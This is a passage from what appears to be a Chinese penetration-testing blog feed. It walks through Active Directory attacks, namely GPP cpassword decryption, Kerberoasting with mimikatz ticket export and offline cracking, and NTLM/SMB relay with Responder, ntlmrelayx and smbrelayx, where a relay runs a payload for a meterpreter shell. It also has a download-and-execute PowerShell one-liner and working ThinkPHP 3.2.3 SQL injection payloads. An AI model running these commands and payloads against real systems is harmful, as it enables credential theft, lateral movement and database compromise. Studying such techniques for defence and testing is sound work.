0xf4<span class="token punctuation">,</span>0x96<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xcc<span class="token punctuation">,</span>0x05<span class="token punctuation">,</span>0x79<span class="token punctuation">,</span>0x90<span class="token punctuation">,</span>0x20<span class="token punctuation">,</span>0x9b<span class="token punctuation">,</span>0x09<span class="token punctuation">,</span>0xa4<span class="token punctuation">,</span>0x33<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0x1b<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Set IV to all nulls to prevent dynamic generation of IV value</span>        <span class="token variable">$AesIV</span> = <span class="token function">New-Object</span> Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>         <span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV = <span class="token variable">$AesIV</span>        <span class="token variable">$AesObject</span><span class="token punctuation">.</span>Key = <span class="token variable">$AesKey</span>        <span class="token variable">$DecryptorObject</span> = <span class="token variable">$AesObject</span><span class="token punctuation">.</span>CreateDecryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$OutBlock</span> = <span class="token variable">$DecryptorObject</span><span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span><span class="token variable">$Base64Decoded</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$Base64Decoded</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token namespace">[System.Text.UnicodeEncoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$OutBlock</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token function">Write-Error</span> <span class="token variable">$Error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><pre><code>1.打补丁KB29624862.删除SYSVOL目录下的groups.xml3.设置共享文件SYSVOL的权限</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><pre><code>setspn.exe -q */*setspn.exe -T test.com -q */*</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><pre><code>cscript GetUserSPNs.vbs</code></pre><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre><p>给MSSQL服务注册SPN</p><pre><code>setspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\fanxing</code></pre><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><pre><code>$SPNName = &#39;MSSQLSvc/WIN-M34UCFJIPNQ.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><pre><code>kerberos::list /export</code></pre><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><pre><code>setspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator</code></pre><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><pre><code>1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(challenge1)，攻击者拿着这个challenge明文发送给客户端。3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</code></pre><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><pre><code>1.HOSTS文件(c:/windows/system32/driver/etc/hosts)2.本地的DNS缓存(ipconfig /displaydns)3.dns服务器4.LLMNR5.NetBios-NS</code></pre><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><pre><code>1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。2.打了ms08-068补丁的xp/2003系统也无法利用</code></pre><p>首先利用nmap探测是否开启了签名</p><pre><code>nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><pre><code>python Responder.py -I eth0 -v      #假设ip为192.168.50.64</code></pre><p>在任意机器上执行</p><pre><code>dir \\192.168.50.64\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><pre><code>python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;   # 攻击机执行</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><pre><code>pip install pycrypto    # 安装加密库apt-get --reinstall install python-pyasn1 python-pyasn1-modulescd impacket/python setup.py install</code></pre><p>在攻击机进行重放攻击</p><pre><code># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exepython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe </code></pre><p>在内网其他目标机器执行</p><pre><code>net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;</code></pre><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><pre><code>powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</code></pre><p>在其他主机上执行</p><pre><code>dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片&lt;img src=&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 漏洞分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T05:17:44.842Z</updated>
    
    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>            <span class="token punctuation">}</span>            <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$options</span>     <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'_string'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 字符串模式查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_complex'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 复合查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><pre><code>1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><pre><code>id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uname</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string">'UPDATE '</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSet</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 多表更新支持JOIN操作</span>            <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//  单表更新支持order和lmit</span>            <span class="token variable">$sql</span>   <span class="token punctuation">.</span><span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token 